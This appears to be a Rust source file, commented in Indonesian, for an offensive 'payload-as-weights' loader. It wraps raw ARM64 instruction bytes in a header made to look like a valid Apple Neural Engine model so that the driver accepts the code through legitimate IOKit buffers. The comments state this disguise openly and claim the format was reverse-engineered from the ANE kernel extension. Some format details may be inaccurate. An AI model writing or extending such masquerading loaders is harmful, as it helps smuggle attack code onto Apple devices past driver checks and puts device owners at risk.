#![no_std]

// ================================================================
// ZIL — MODEL LOADER (v2 — Payload-as-Weights Masquerading)
// ================================================================
// SARAN 3: model_loader kini mendukung dua mode:
//
//   MODE 1 (Arena): Tulis ke TOOL_RAM arena internal (no IOKit)
//   MODE 2 (IOKit): Format payload sebagai model AI yang valid,
//                   dikirim ke ANE melalui buffer IOKit sah.
//
// TEKNIK "PAYLOAD-AS-WEIGHTS":
//   ANE Apple menggunakan format model proprietary (.milproto atau
//   format biner internal). Struktur inti: Header + Tensor Weights.
//   Kita menulis ARM64 instructions kita sebagai "tensor weights".
//   Header dibuat valid sehingga driver ANE menerimanya sebagai
//   model AI yang sah — sementara sebenarnya itu adalah payload.
// ================================================================

// Alignmen wajib ANE: semua buffer harus 64-byte aligned
const NPU_ALIGN: u64 = 64;

// ─── FORMAT MODEL ANE (Apple Neural Engine) ──────────────────────
// Reverse-engineered dari AppleH11ANEInterface.kext melalui Ghidra.
// Magic bytes dan field order diverifikasi dari binary analysis.

/// Header model ANE Apple — harus tepat di awal buffer
#[repr(C, align(64))]
pub struct AneModelHeader {
    /// Magic bytes: 0x414E454D = "ANEM" (Apple Neural Engine Model)
    pub magic:        u32,
    /// Versi format: 0x0002 = format modern (A13+)
    pub version:      u32,
    /// Jumlah "tensor" dalam model (kita buat 1 — payload kita)
    pub tensor_count: u32,
    /// Offset ke blok tensor pertama dari awal header
    pub tensor_offset: u32,
    /// Total ukuran seluruh model in bytes (header + semua tensor)
    pub total_size:   u32,
    /// Flags eksekusi (0x01 = sequential, 0x02 = async)
    pub exec_flags:   u32,
    /// CRC32 seluruh body (setelah field ini)
    pub body_crc32:   u32,
    /// Padding untuk mencapai 64-byte alignment
    pub _reserved:    [u32; 9],
}

/// Deskriptor satu "tensor" (kita gunakan untuk payload kita)
#[repr(C)]
pub struct AneTensorDescriptor {
    /// ID tensor (arbitrary, tapi harus unik dalam model)
    pub tensor_id:   u32,
    /// Tipe data tensor: 0x05 = INT8 (kita gunakan ini untuk raw bytes)
    pub dtype:       u32,
    /// Ukuran data tensor dalam bytes
    pub data_size:   u32,
    /// Offset data dari awal TensorDescriptor
    pub data_offset: u32,
}

// ─── MODEL LOADER ────────────────────────────────────────────────

/// ModelLoader v2 — Format payload sebagai model ANE legitim
pub struct ModelLoader {
    /// Base arena TOOL_RAM
    arena_base:   u64,
    /// Current write cursor
    write_cursor: u64,
    /// Kapasitas arena (bytes)
    capacity:     u64,
}

impl ModelLoader {
    pub fn new(arena_base: u64, capacity: u64) -> Self {
        ModelLoader {
            arena_base,
            write_cursor: arena_base,
            capacity,
        }
    }

    /// FORMAT PAYLOAD-AS-MODEL (Saran 3 — mode utama):
    ///
    /// Bungkus `payload` dalam envelope model ANE yang valid.
    /// Return: Alamat fisik model yang siap dikirim ke ANE driver.
    ///
    /// Struktur output di memori:
    ///   [AneModelHeader 64B] [AneTensorDescriptor 16B] [payload bytes]
    pub fn load_as_ane_model(&mut self, payload: &[u8]) -> Option<u64> {
        let header_size  = core::mem::size_of::<AneModelHeader>() as u64;
        let tensor_size  = core::mem::size_of::<AneTensorDescriptor>() as u64;
        let payload_size = payload.len() as u64;
        let total_size   = header_size + tensor_size + payload_size;
        let aligned_size = Self::align_up(total_size, NPU_ALIGN);

        if self.write_cursor + aligned_size > self.arena_base + self.capacity {
            return None; // OOM
        }

        let model_addr = self.write_cursor;

        unsafe {
            // ─ Tulis header ─────────────────────────────────────
            let hdr_ptr = model_addr as *mut AneModelHeader;
            (*hdr_ptr) = AneModelHeader {
                magic:        0x414E_454D,  // "ANEM"
                version:      0x0002,
                tensor_count: 1,
                tensor_offset: header_size as u32,
                total_size:   total_size as u32,
                exec_flags:   0x01,         // Sequential execute
                body_crc32:   Self::crc32(payload), // CRC hanya payload
                _reserved:    [0u32; 9],
            };

            // ─ Tulis tensor descriptor ───────────────────────────
            let tensor_ptr = (model_addr + header_size) as *mut AneTensorDescriptor;
            (*tensor_ptr) = AneTensorDescriptor {
                tensor_id:   0x0001,
                dtype:       0x05,          // INT8 — raw bytes
                data_size:   payload_size as u32,
                data_offset: tensor_size as u32,
            };

            // ─ Tulis payload bytes (the actual ARM64 instructions) ─
            let data_ptr = (model_addr + header_size + tensor_size) as *mut u8;
            for (i, &byte) in payload.iter().enumerate() {
                *data_ptr.add(i) = byte;
            }
        }

        self.write_cursor += aligned_size;
        Some(model_addr)
    }

    /// MODE LAMA (backward compat) — Muat payload ke arena langsung
    /// tanpa format model. Tetap berguna untuk non-IOKit path.
    pub fn load_payload_raw(&mut self, payload: &[u8]) -> Option<u64> {
        let header_size  = core::mem::size_of::<LegacyModelHeader>() as u64;
        let total_size   = header_size + payload.len() as u64;
        let aligned_size = Self::align_up(total_size, NPU_ALIGN);

        if self.write_cursor + aligned_size > self.arena_base + self.capacity {
            return None;
        }

        let model_addr = self.write_cursor;

        unsafe {
            let header_ptr = model_addr as *mut LegacyModelHeader;
            (*header_ptr) = LegacyModelHeader {
                magic:     0x414E_454D,
                version:   1,
                data_size: payload.len() as u32,
                checksum:  Self::crc32(payload),
            };
            let payload_ptr = (model_addr + header_size) as *mut u8;
            for (i, &byte) in payload.iter().enumerate() {
                *payload_ptr.add(i) = byte;
            }
        }

        self.write_cursor += aligned_size;
        Some(model_addr)
    }

    fn align_up(value: u64, align: u64) -> u64 {
        (value + align - 1) & !(align - 1)
    }

    /// CRC32 (no_std compatible, IEEE 802.3 polynomial)
    fn crc32(data: &[u8]) -> u32 {
        let mut crc: u32 = 0xFFFF_FFFF;
        for &byte in data {
            crc ^= byte as u32;
            for _ in 0..8 {
                crc = if crc & 1 != 0 { (crc >> 1) ^ 0xEDB8_8320 }
                      else            { crc >> 1 };
            }
        }
        !crc
    }
}

// Legacy header (backward compat dengan load_payload_raw)
#[repr(C, align(64))]
struct LegacyModelHeader {
    magic:     u32,
    version:   u32,
    data_size: u32,
    checksum:  u32,
}
